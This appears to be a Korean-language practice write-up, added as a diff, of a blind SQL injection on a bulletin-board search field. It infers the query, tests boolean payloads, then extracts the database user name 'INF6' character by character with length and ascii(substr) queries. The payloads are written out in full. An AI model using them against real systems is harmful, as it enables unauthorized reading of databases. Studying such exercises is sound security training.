@@ -1,0 +1,28 @@
+1. 쿼리문 유추
+select * from 자유게시판 where 제목 like '%_검색_%'
+
+2. 공격 포인트
+hi' -> 검색했는데 에러가 뜸
+_검색_ : puppy' and sdfa=fae and '%'='
+        puppy' and 1=1 and '%'='
+    공격 쿼리: puppy' and _공격쿼리_ and '%'='
+
+3. 유저명
+select user from dual
+    3-1. 유저명 길이 찾기: 4
+        (select length(user) from dual)=3
+        > pup%' and (select length(user) from dual)=4 and '%'='
+    3-2. 유저명 찾기: 73, 78, 70, 54
+        (select ascii(substr(user,1,1)) from dual)=90
+        > pup%' and (select ascii(substr(user,1,1)) from dual)>40 and '%'='
+    3-3. 파이썬으로 아스키->문자 바꾸기
+        >>> chr(73)
+        'I'
+        >>> chr(78)
+        'N'
+        >>> chr(70)
+        'F'
+        >>> chr(54)
+        '6'
+
+[답] INF6
